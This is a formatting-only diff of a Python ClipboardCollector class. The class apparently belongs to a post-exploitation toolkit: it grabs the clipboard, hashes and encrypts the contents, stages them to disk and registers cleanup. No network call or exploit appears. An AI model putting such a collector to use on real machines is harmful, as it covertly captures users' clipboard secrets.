@@ -1,4 +1,3 @@
-
 from __future__ import annotations
 
 import logging
@@ -9,6 +8,7 @@ from forge.utils.post.collectors.filesystem import ArtifactMetadata, BaseCollect
 
 _LOG = logging.getLogger(__name__)
 
+
 class ClipboardCollector(BaseCollector):
     """
     Single clipboard snapshot. No polling. Cross-platform via pyperclip.
@@ -17,6 +17,7 @@ class ClipboardCollector(BaseCollector):
     def discover(self) -> Generator[ArtifactMetadata, None, None]:
         try:
             import pyperclip
+
             content = pyperclip.paste()
         except ImportError:
             _LOG.debug("pyperclip not installed — ClipboardCollector disabled.")
@@ -38,6 +39,7 @@ class ClipboardCollector(BaseCollector):
     def collect(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
         try:
             import pyperclip
+
             content = pyperclip.paste()
         except ImportError:
             return None
@@ -48,8 +50,8 @@ class ClipboardCollector(BaseCollector):
         if not content:
             return None
 
-        data    = content.encode("utf-8", errors="replace")
-        sha256  = self._sha256(data)
+        data = content.encode("utf-8", errors="replace")
+        sha256 = self._sha256(data)
         payload = self._compress_and_encrypt(data)
         del data
         del content
@@ -59,10 +61,10 @@ class ClipboardCollector(BaseCollector):
         self._register_cleanup(stage_path)
 
         record = CollectedFile(
-            path       = "CLIPBOARD",
-            sha256     = sha256,
-            size_bytes = len(payload),
-            metadata   = artifact,
+            path="CLIPBOARD",
+            sha256=sha256,
+            size_bytes=len(payload),
+            metadata=artifact,
         )
         self.persist_metadata(record)
         return record
